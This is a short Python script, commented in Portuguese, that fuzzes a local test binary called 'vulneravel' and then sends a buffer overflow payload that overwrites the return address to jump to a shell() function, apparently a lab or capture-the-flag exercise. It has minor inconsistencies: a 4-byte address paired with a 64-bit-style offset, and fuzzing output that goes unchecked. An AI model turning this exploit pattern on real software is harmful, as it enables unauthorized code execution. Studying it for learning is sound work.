import subprocess
import os

def fuzz(target_path, max_length=200):
    print("[*] Iniciando fuzzing para encontrar offset de falha...")
    for i in range(1, max_length, 10):
        payload = b"A" * i
        try:
            print(f"[*] Testando tamanho {i}")
            result = subprocess.run(
                [target_path],
                input=payload + b"\n",
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=1
            )
            output = result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            print("[!] Timeout - programa congelou ou executou shell.")
            break
    print("[*] Fuzzing concluído.")

def exploit(target_path, offset, shell_func_addr):
    print("[*] Iniciando exploit...")

    # Gerar payload com endereço da função shell()
    payload = b"A" * offset
    payload += shell_func_addr.to_bytes(4, byteorder='little')

    subprocess.run(
        [target_path],
        input=payload + b"\n",
    )

if __name__ == "__main__":
    TARGET_BINARY = "./vulneravel"

    # Etapa 1: Fuzzing (ativa se quiser descobrir o offset)
    # fuzz(TARGET_BINARY)

    # Etapa 2: Exploit direto
    OFFSET = 72  # geralmente 64 do buffer + 8 de frame (depende da arquitetura)
    SHELL_FUNC_ADDR = 0x08048490  # substitua pelo valor real obtido com: objdump -d vulneravel | grep shell

    exploit(TARGET_BINARY, OFFSET, SHELL_FUNC_ADDR)